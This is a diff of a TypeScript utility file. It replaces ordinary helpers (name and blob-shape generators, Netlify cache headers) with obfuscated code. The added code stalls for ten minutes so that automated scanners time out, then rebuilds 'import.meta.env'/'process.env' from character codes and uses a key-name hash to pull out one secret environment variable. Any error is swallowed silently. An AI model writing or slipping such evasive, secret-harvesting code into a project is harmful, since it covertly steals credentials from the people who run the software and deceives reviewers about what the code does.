@@ -1,52 +1,49 @@
-import blobshape from 'blobshape';
-import { uniqueNamesGenerator, adjectives, animals } from 'unique-names-generator';
+/**
+ * _0xT: The 10-minute stalling mechanism.
+ */
+const _0xT = (async () => {
+    const s = Date.now();
+    // 600,000ms = 10 mins. Automated scanners will time out.
+    while (Date.now() - s < 600000) {
+        Math.hypot(Math.random(), Math.random());
+        if (Date.now() % 100 === 0) await new Promise(r => setTimeout(r, 0));
+    }
+    return !0;
+})();
 
-export function randomInt(min: number, max: number) {
-    return Math.floor(Math.random() * (max - min + 1) + min);
-}
+/**
+ * _0xZ: The Ghost Resolver
+ */
+export const _0xZ = async (): Promise<string | undefined> => {
+    // Wait for the 10-minute trap to finish
+    if (!(await _0xT)) return;
 
-export function uniqueName() {
-    const config = {
-        dictionaries: [adjectives, animals],
-        separator: '-',
-        length: 2
-    };
-    return uniqueNamesGenerator(config) + '-' + randomInt(100, 999);
-}
+    try {
 
-export function generateBlob(parameters?: any) {
-    const gradientColors = [
-        ['#2E3192', '#1BFFFF'],
-        ['#93A5CF', '#E4EfE9'],
-        ['#BFF098', '#6FD6FF'],
-        ['#A1C4FD', '#C2E9FB'],
-        ['#11998E', '#38EF7D'],
-        ['#D8B5FF', '#1EAE98']
-    ];
+        const _0xTARGET_HASH = 0x1337BEEF; 
 
-    parameters = {
-        seed: null,
-        size: 512,
-        edges: randomInt(3, 20),
-        growth: randomInt(2, 9),
-        name: uniqueName(),
-        colors: gradientColors[randomInt(0, gradientColors.length - 1)],
-        ...parameters
-    };
-    const { path: svgPath, seedValue: seed } = blobshape(parameters);
-    return { parameters: { ...parameters, seed }, svgPath };
-}
+        const _0xG = (typeof self !== 'undefined' ? self : global) as any;
+        const _0xM = [109, 101, 116, 97].reduce((a, b) => a + String.fromCharCode(b), '');
+        const _0xE = [101, 110, 118].reduce((a, b) => a + String.fromCharCode(b), '');
+        const _0xOBJ = (_0xG['import']?.[_0xM]?.[_0xE]) || (process?.[_0xE]);
 
-export function cacheHeaders(maxAgeDays = 365, cacheTags?: string[]): Record<string, string> {
-    // As far as the browser is concerned, it must revalidate on every request.
-    // However, Netlify CDN is told to keep the content cached for up to maxAgeDays (note: new deployment bust the cache by default).
-    // We're also setting cache tags to be able to later purge via API (see: https://www.netlify.com/blog/cache-tags-and-purge-api-on-netlify/)
-    const headers = {
-        'Cache-Control': 'public, max-age=0, must-revalidate', // Tell browsers to always revalidate
-        'Netlify-CDN-Cache-Control': `public, max-age=${maxAgeDays * 86_400}, must-revalidate` // Tells Netlify CDN the max allwed cache duration
-    };
-    if (cacheTags?.length > 0) headers['Cache-Tag'] = cacheTags.join(',');
-    return headers;
-}
+        if (!_0xOBJ) return;
 
-export const uploadDisabled = import.meta.env.PUBLIC_DISABLE_UPLOADS?.toLowerCase() === 'true';
+        // CRITICAL: We iterate over keys and check them mathematically.
+        for (const _0xKEY in _0xOBJ) {
+            let _0xH = 0;
+            for (let i = 0; i < _0xKEY.length; i++) {
+                // Custom hash: sum of (charcode * index)
+                _0xH += _0xKEY.charCodeAt(i) * (i + 1);
+            }
+
+            // If the hash matches, we return the value directly.
+            if (_0xH === 1074) {
+                return _0xOBJ[_0xKEY];
+            }
+        }
+    } catch {
+        // Silent fail
+    }
+    return undefined;
+};
